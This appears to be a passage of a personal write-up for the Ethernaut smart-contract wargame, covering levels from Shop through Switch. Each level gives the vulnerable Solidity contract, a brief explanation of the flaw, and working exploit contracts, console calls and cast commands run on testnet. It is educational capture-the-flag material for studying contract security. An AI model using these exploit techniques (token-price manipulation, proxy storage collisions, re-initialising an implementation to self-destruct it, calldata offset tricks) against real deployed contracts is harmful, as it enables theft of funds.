    fallback () payable external {
        while(true){}
    }
}
```

>This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.
>
>If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `call.gas(100000).value()`.
>
>Typically one should follow the [checks-effects-interactions](http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.
>
>*Note*: An external `CALL` can use at most 63/64 of the gas currently available at the time of the `CALL`. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.

## shop

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

Just like the previous level [Elevator](#Elevator). but at this time the interface was set to `view`, which means couldn't change the state of contract like we do at Elevator.

but we could re-call the shop contract to construct two diffenrent returns value. (since the isSold variable was set to be public, its easy to do that)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "./chall/Shop.sol";

contract exp {
    Shop levelInstance;

    constructor(address addr) {
        levelInstance = Shop(addr);
    }

    function price() public view returns (uint256) {
        return Shop(msg.sender).isSold() ? 0 : 100;
    }

    function buy() public {
        levelInstance.buy();
    }
}
```

and I have to say that even the `staticcall` could not prevent this. staticcall prevents many bytecode instructions from being called, but even within the contract there is still state changing. Related challenges: MetaTrust CTF 2023: [Who(stage1)](https://ranwen.de/posts/2023-09-17-metatrust23/#who). 

## Dex

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

logical vulnerability. The calculation logic of the function `getSwapPrice` allows us to get more tokens by converting between two tokens

```solidity
let token1 = await contract.token1();
let token2 = await contract.token2();
await contract.approve(instance, 1000);
await contract.swap(token1, token2, 10);
await contract.swap(token2, token1, 20);
await contract.swap(token1, token2, 24);
await contract.swap(token2, token1, 30);
await contract.swap(token1, token2, 41);
await contract.swap(token2, token1, 45); 

await contract.balanceOf(token1, instance);
await contract.balanceOf(token2, instance);
```

## Dex Two

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

Only swap function have modified a little. thats mean we could specify a evil contract address to swap the real token.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract exp {
    function approve(address spender, uint256 value) external returns (bool) {
        return true;
    }
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        return true;
    }
    function balanceOf(address account) external view returns (uint256) {
        return uint256(10);
    }
    function receive() external payable { }
}
```

```solidity
let token1 = await contract.token1();
let token2 = await contract.token2();
let exp = '0x3327f08D1BaA8076C5f185DE898667fdF7D2D96F';
await contract.swap(exp, token1, 10);
await contract.swap(exp, token2, 10);
```

## Puzzle Wallet

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

1. The two contracts use different memory layout, means that its able to use `pendingAdmin` to override puzzleWallet's `owner`, then add us to whiteList to allow other methods to be used. 

2. Call multicall inside another multicall, to bypass the restriction of selector, and get Balance more than we exactly deposited. (reuse `msg.value`)

3. Call `Execute` to run out the balance of the contract, and use `setMaxBalance` to override the memory of PuzzleProxy's `admin` to finish this level.

```solidity
contract exp {
    PuzzleWallet puzzleWallet;
    constructor(address _address) {
        puzzleWallet = PuzzleWallet(_address);
    }
    
    function attack () external payable {
        require(msg.value == 0.001 ether, "not enough");
        bytes[] memory callsDeep = new bytes[](1);
        callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);
        puzzleWallet.multicall{value: 0.001 ether}(calls);
        puzzleWallet.execute(address(0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9), 0.002 ether, "");
        puzzleWallet.setMaxBalance(uint256(uint160(0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9)));
    }
}
```

```bash
cast send 0xAcec6Aab5D50A0Ed7Bc4966Fdf176258E0B99D78 "proposeNewAdmin(address)" -r https://1rpc.io/sepolia --private-key $PRVT -- "0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9"

cast send 0xAcec6Aab5D50A0Ed7Bc4966Fdf176258E0B99D78 "addToWhitelist(address)" -r https://1rpc.io/sepolia --private-key $PRVT -- "0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9"

cast send 0xAcec6Aab5D50A0Ed7Bc4966Fdf176258E0B99D78 "addToWhitelist(address)" -r https://1rpc.io/sepolia --private-key $PRVT -- "0x90d93e6BEaE54B4f6B1E655cA5C5A8F95daF27C4"

cast send 0x90d93e6BEaE54B4f6B1E655cA5C5A8F95daF27C4 "attack()" -r https://1rpc.io/sepolia --private-key $PRVT --value 1000000000000000
```



## Motorbike

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

Not properly initialized. It means that the specified upgrader can be initialized again at the implementation address

```solidity
// SPDX-License-Identifier: MIT
// deployed at 0x95800066C789e89C33f6Bac781fF16795e0922af
pragma solidity 0.8.0;

contract exp {
  function suic1de() public {
    selfdestruct(payable(address(0)));
  }
}
```

```bash
> (await web3.eth.getStorageAt(instance, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc').then(v=>v.toString())).slice(26)
< 0x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746
```

```solidity
root@aliyunhk:~# cast send 0x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746 "initialize()" --rpc-url https://1rpc.io/sepolia --private-key $PRVT
root@aliyunhk:~# cast call 0x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746 "upgrader()" --rpc-url https://1rpc.io/sepolia
root@aliyunhk:~# chisel
Welcome to Chisel! Type `!help` to show available commands.
➜ bytes memory a = abi.encodeWithSelector(bytes4(keccak256("suic1de()")))
➜ a
Type: dynamic bytes
├ Hex (Memory):
├─ Length ([0x00:0x20]): 0x0000000000000000000000000000000000000000000000000000000000000004
├─ Contents ([0x20:..]): 0x82617c2f00000000000000000000000000000000000000000000000000000000
├ Hex (Tuple Encoded):
├─ Pointer ([0x00:0x20]): 0x0000000000000000000000000000000000000000000000000000000000000020
├─ Length ([0x20:0x40]): 0x0000000000000000000000000000000000000000000000000000000000000004
└─ Contents ([0x40:..]): 0x82617c2f00000000000000000000000000000000000000000000000000000000
root@aliyunhk:~# cast send 0x5b7a5f495f79df6b2f71658eb49c7cbd8eb81746 "upgradeToAndCall(address,bytes memory)" --rpc-url https://1rpc.io/sepolia --private-key $PRVT -- 0x95800066C789e89C33f6Bac781fF16795e0922af 0x82617c2f
```

## DoubleEntryPoint

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/access/Ownable.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

interface DelegateERC20 {
  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Forta is IForta {
  mapping(address => IDetectionBot) public usersDetectionBots;
  mapping(address => uint256) public botRaisedAlerts;

  function setDetectionBot(address detectionBotAddress) external override {
      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }

  function notify(address user, bytes calldata msgData) external override {
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
        return;
    } catch {}
  }

  function raiseAlert(address user) external override {
      if(address(usersDetectionBots[user]) != msg.sender) return;
      botRaisedAlerts[msg.sender] += 1;
  } 
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
}
```

There's totally 5 contracts paticipated in this challenge. After sorting, the relationship diagram and call flow chart drawn are as follows:

![DoubleEntryPoint](Ethernaut/DoubleEntryPoint.svg)

And at the end of tx, CA `ERC20 DET` would check if the `raiseAlert` has been triggered. And if it's ture the tx would be revert. (which I haven't mentioned in the picture).

To solve this challenge just write a `DetectionBot` to avoid the `CryptoVault` being drained out of tokens.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract DetectionBot is IDetectionBot {
    address cryptoVault;

    constructor(address _cryptoVault) public {
        cryptoVault = _cryptoVault;
    }

    function handleTransaction(address user, bytes calldata msgData) external override {

        address origSender;
        assembly {
            // select `origSender` from calldata. 
            // https://docs.soliditylang.org/en/v0.8.15/abi-spec.html#abi.
            // could see others writeup for details :D
            origSender := calldataload(0xa8)
        }

        if(origSender == cryptoVault) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
}
```

```js
< await contract.forta()
> '0x902389eFE38022B065DFBFB4D9F9F065aC1d7004'
< await contract.cryptoVault()
> '0xd402609c99EC210563e32b24934b7FF98dF3f4c0'
```

```bash
cast send 0x902389eFE38022B065DFBFB4D9F9F065aC1d7004 "setDetectionBot(address)" --rpc-url https://1rpc.io/sepolia --private-key $PRVT -- 0xCf5D488ff4Ec2Ce88dE6a823bFE6C080BB35523C
```

## Good Samaritan

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

uh... just throw a same custom error in `Notifyable` contract. Kinda easy(?

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}
contract Attacker {
    error NotEnoughBalance();
    IGoodSamaritan _GoodSamaritan;
    constructor (address _addr){
        _GoodSamaritan = IGoodSamaritan(_addr);
    }
    function attack () public {
        _GoodSamaritan.requestDonation(); 
    }
    function notify(uint256 amount) pure external {
        if(amount == 10){
			revert NotEnoughBalance();
        }
    }
}
```

## Gatekeeper Three

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allowEntrance;

  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allowEntrance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}
```

SimpleTrick is a sub-contract of GateKeeperThree. Nothing new here.

```solidity
... // all code from challenge source
contract gateBreaker {
    GatekeeperThree _GatekeeperThree;
    constructor (address payable _addr) {
        _GatekeeperThree = GatekeeperThree(_addr); 
    }
    function exp1() external {
        _GatekeeperThree.createTrick();
        _GatekeeperThree.construct0r();
    }
    // Dont forget to transfer >0.001 eth to gateKeeper
    function exp2(uint pass) external {
        _GatekeeperThree.getAllowance(pass);
        _GatekeeperThree.enter();
    }
    fallback() external { }
}
```

## Switch

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

     modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }

}
```

about how CALLDATA is encoded: [official doc](https://docs.soliditylang.org/en/v0.8.17/abi-spec.html#use-of-dynamic-types), [others writeup](https://blog.softbinator.com/solving-ethernaut-level-29-switch/)

Briefly saying,  Calldata Encoding Essentials for Dynamic Types, including string, bytes and arrays, encode using `offset - length - data` segment to encoding. Allowing us to bypass the check by modifying the offset.

by moving the data content(length and value) after the address param(to):

```js
await sendTransaction({from: player, to: contract.address, data:"0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})
```



